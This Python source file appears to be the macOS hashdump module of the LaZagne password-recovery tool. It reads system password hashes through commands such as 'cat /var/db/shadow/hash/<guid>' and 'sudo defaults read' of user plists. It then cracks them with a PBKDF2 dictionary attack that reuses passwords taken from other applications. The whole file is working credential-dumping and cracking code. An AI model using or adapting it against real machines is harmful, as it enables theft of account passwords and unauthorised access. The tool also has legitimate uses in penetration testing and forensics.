# -*- coding: utf-8 -*-

# Inspired from :
# https://apple.stackexchange.com/questions/220729/what-type-of-hash-are-a-macs-password-stored-in
# https://www.onlinehashcrack.com/how-to-extract-hashes-crack-mac-osx-passwords.php

# TO DO: retrieve hash on mac os Lion without need root access: https://hackademics.fr/forum/hacking-connaissances-avancées/unhash/1098-mac-os-x-python-os-x-lion-password-cracker 
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.dico import get_dico
from lazagne.config.constant import *
from xml.etree import ElementTree
import subprocess
import binascii
import platform
import hashlib
import base64
import os

class Hashdump(ModuleInfo):
	def __init__(self):
		options = {'command': '-hashdump', 'action': 'store_true', 'dest': 'hashdump', 'help': 'System hash'}
		ModuleInfo.__init__(self, 'hashdump', 'system', options)

		self.username 	= None
		self.iterations = None
		self.salthex 	= None
		self.entropyhex = None

	def root_access(self):
		if os.getuid() != 0:
			print_debug('WARNING', 'You need more privileges (run it with sudo)')
			return False
		return True

	def check_version(self):
		major, minor = 0, 0
		try:
			v, _, _ = platform.mac_ver()
			v = '.'.join(v.split('.')[:2])
			major = v.split('.')[0]
			minor = v.split('.')[1]
		except Exception, e:
			# print e
			pass
		return int(major), int(minor)

	def run_cmd(self, cmd):
		p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		result, _ = p.communicate()
		if result:
			return result
		else:
			return ''

	def list_users(self):
		users_dir 	= '/Users'
		users_list 	= [] 
		if os.path.exists(users_dir):
			for user in os.listdir(users_dir): 
				if user != 'Shared' and not user.startswith('.'):
					users_list.append(user)

		return users_list

	# works for all version (< 10.8)
	def get_hash_using_guid(self, guid):
		cmd = 'cat /var/db/shadow/hash/%s' % guid
		hash = self.run_cmd(cmd)
		if hash:
			print_debug('INFO', 'Full hash found : %s ' % hash)
			# Salted sha1: hash[104:152]
			# Zero salted sha1: hash[168:216]
			# NTLM: hash[64:]
			return hash[168:216]
		else:
			return False

	# this technic works only for OS X 10.3 and 10.4
	def get_user_hash_using_niutil(self, username):
		# get guid
		cmd 	= 'niutil -readprop . /users/%s generateduid' % username
		guid 	= self.run_cmd(cmd)
		if guid:
			guid = guid.strip()	
			print_debug('INFO', 'GUID found : %s ' % guid)
			
			# get hash
			hash = self.get_hash_using_guid(guid)
			if hash: 
				return username, hash

		return False

	# this technic works only for OS X 10.5 and 10.6
	def get_user_hash_using_dscl(self, username):
		# get guid
		cmd 	= 'dscl localhost -read /Search/Users/%s | grep GeneratedUID | cut -c15-' % username
		guid 	= self.run_cmd(cmd)
		if guid:
			guid = guid.strip()	
			print_debug('INFO', 'GUID found : %s ' % guid)
			
			# get hash
			hash = self.get_hash_using_guid(guid)
			if hash: 
				return username, hash

		return False

	# this technic works only for OS X >= 10.8
	def get_user_hash_from_plist(self, username):
		try:
			cmd = 'sudo defaults read /var/db/dslocal/nodes/Default/users/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' % username
			raw = self.run_cmd(cmd)

			if len(raw) > 100:
				root 		= ElementTree.fromstring(raw)
				children 	= root[0][1].getchildren()
				entropy64 	= ''.join(children[1].text.split())
				iterations 	= children[3].text
				salt64 		= ''.join(children[5].text.split())
				entropyraw 	= base64.b64decode(entropy64)
				entropyhex 	= entropyraw.encode("hex")
				saltraw 	= base64.b64decode(salt64)
				salthex 	= saltraw.encode("hex")

				self.username 	= username
				self.iterations = int(iterations)
				self.salthex 	= salthex
				self.entropyhex = entropyhex

				return '{username}:$ml${iterations}${salt}${entropy}'.format(
																				username=username, 
																				iterations=iterations, 
																				salt=salthex, 
																				entropy=entropyhex
																			)
		except Exception as e:
			print_debug('ERROR', e)
			pass

	# ------------------------------- Dictionary attack -------------------------------

	def dictionary_attack(self, username, dic, pbkdf2=True):
		found = False 
		try:
			if pbkdf2:
				print_debug('INFO', 'Dictionary attack started !')
				for word in dic:
					print_debug('INFO', 'Trying word: %s' % word)
					if str(self.entropyhex) == str(self.dictionary_attack_pbkdf2(str(word), binascii.unhexlify(self.salthex), self.iterations)):
						constant.system_pwd.append(
														{
															'Account': 	username, 
															'Password': word
														}
													)
						print_debug('INFO', 'Password found: %s' % word)
						found = True
						break
		except (KeyboardInterrupt, SystemExit):
			print 'INTERRUPTED!'
			print_debug('DEBUG', 'Dictionary attack interrupted')

		return found

	# On OS X >= 10.8
	# System passwords are stored using pbkdf2 algorithm
	def dictionary_attack_pbkdf2(self, password, salt, iterations):
		hex = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, 128)
		password_hash = binascii.hexlify(hex)
		return password_hash

	# ------------------------------- End of Dictionary attack -------------------------------

	def run(self, software_name=None):
		userhashes 	= []

		if self.root_access():
			major, minor = self.check_version()
			if major == 10 and (minor == 3 or minor == 4):
				for user in self.list_users(): 
					print_debug('INFO', 'User found: %s' % user)
					userhash = self.get_user_hash_using_niutil(user)
					if userhash: 
						userhashes.append(userhash)

			if major == 10 and (minor == 5 or minor == 6):
				for user in self.list_users(): 
					print_debug('INFO', 'User found: %s' % user)
					userhash = self.get_user_hash_using_dscl(user)
					if userhash: 
						userhashes.append(userhash)

			# TO DO: manage version 10.7

			elif major == 10 and minor >= 8:
				usernames 	= [plist.split(".")[0] for plist in os.listdir(u'/var/db/dslocal/nodes/Default/users/') if not plist.startswith(u'_')]
				for username in usernames:
					userhash = self.get_user_hash_from_plist(username)
					if userhash:
						userhashes.append(userhash)
						
						# try to get the password in cleartext
						passwords = constant.passwordFound		# check if passwords found in other applications are also used as system password
						passwords.insert(0, username) 			# add the user on the list to found weak password (login equal password)
						if constant.user_password:
							passwords.insert(0, constant.user_password)

						found = self.dictionary_attack(username, passwords)

						# realize a dictionary attack using the 500 most famous passwords
						if constant.dictionary_attack and not found:
							dic = get_dico()
							dic.insert(0, self.username)
							self.dictionary_attack(username, dic)
		
		return ['__SYSTEM__', userhashes]

